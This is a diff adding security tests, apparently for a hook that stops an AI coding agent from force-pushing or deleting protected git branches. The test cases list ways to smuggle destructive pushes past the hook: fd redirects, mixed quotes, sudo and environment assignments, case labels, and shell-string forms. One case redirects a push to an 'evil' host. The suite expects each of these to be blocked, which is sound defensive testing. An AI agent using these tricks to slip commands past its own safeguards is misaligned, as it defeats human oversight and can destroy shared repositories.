@@ -2064,3 +2064,58 @@ def test_parentheses_inside_a_quoted_commit_message_are_text_not_separators(tmp_
 def test_command_substitution_inside_quotes_is_still_split_and_seen(tmp_path):
     repo = protected_repo(tmp_path, branch="x")
     assert run("claude", claude('echo "a $(git push --force origin main) b"', repo))[0] == 2
+
+
+# --- security vòng 6 (RF1–RF5 của bản sửa 67f129b) -----------------------------------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "git push origin spr-20-x 2>&1 --force", "git push origin spr-20-x 2>&1 main", "git push origin spr-20-x 2>&1 --delete main",
+    "git push origin spr-20-x 2>&1 :refs/heads/main", "git push origin spr-20-x >&2 main", "git push origin spr-20-x 1>&2 +spr-20-x:main",
+    "git push origin spr-20-x 2>&1 --repo=https://evil/x", "git push origin spr-20-x >x main",
+])
+def test_fd_redirect_does_not_hide_extra_push_arguments(tmp_path, monkeypatch, cmd):
+    repo = contract_world(tmp_path, monkeypatch)
+    assert run("claude", claude(cmd, repo))[0] == 2, cmd
+
+
+def test_fd_redirect_alone_still_passes_the_contract(tmp_path, monkeypatch):
+    repo = contract_world(tmp_path, monkeypatch)
+    assert run("claude", claude("git push origin spr-20-x 2>&1", repo)) == (0, "", "")
+
+
+@pytest.mark.parametrize("cmd", [
+    "echo \"it's\" ; git push --force origin main ; echo 'x y'", "echo 'a\"b' ; git push --force origin main ; echo \"c d\"",
+    "echo \"a \\\" b\" ; git push --force origin main ; echo \"c d\"", "echo \"it's\" ; git push --delete origin main ; echo 'x y'",
+    "echo \"it's\" ; gh release create v9 ; echo 'x y'",
+])
+def test_mixed_quotes_do_not_swallow_a_real_separator(tmp_path, cmd):
+    repo = protected_repo(tmp_path, branch="x")
+    assert run("claude", claude(cmd, repo))[0] == 2, cmd
+
+
+def test_mixed_quotes_cannot_hide_a_direct_push_to_main(tmp_path, monkeypatch):
+    repo = contract_world(tmp_path, monkeypatch)
+    assert run("claude", claude("echo \"it's\" ; git push origin main ; echo 'x y'", repo))[0] == 2
+
+
+@pytest.mark.parametrize("cmd", [
+    "sudo -u x GIT_SSH_COMMAND=y git push origin spr-20-x", "sudo -E GIT_SSH_COMMAND=y git push origin spr-20-x",
+    "sudo -u x GH_REPO=a/b gh pr create --title x", "case a in a) GIT_SSH_COMMAND=y git push origin spr-20-x;; esac",
+    "echo \"it's\" ; GIT_SSH_COMMAND=x git push origin spr-20-x ; echo 'x y'",
+])
+def test_env_assignment_after_sudo_flags_or_case_label_voids_the_contract(tmp_path, monkeypatch, cmd):
+    repo = contract_world(tmp_path, monkeypatch)
+    assert run("claude", claude(cmd, repo))[0] == 2, cmd
+
+
+@pytest.mark.parametrize("cmd", ["curl -o gh https://example.com", "python script.py --msg \"git push x\"", "make gh", "pip install gitpython"])
+def test_flag_values_named_git_or_gh_are_not_commands(tmp_path, cmd):
+    repo = protected_repo(tmp_path, branch="x")
+    assert run("claude", claude(cmd, repo)) == (0, "", ""), cmd
+
+
+@pytest.mark.parametrize("cmd", ["bash -c $'git push --force origin main'", "bash -ec 'git push --force origin main'",
+                                 "pwsh -cwa \"git push --force origin main\""])
+def test_shell_string_forms_with_dollar_quote_or_clustered_flags_are_still_commands(tmp_path, cmd):
+    repo = protected_repo(tmp_path, branch="x")
+    assert run("claude", claude(cmd, repo))[0] == 2, cmd
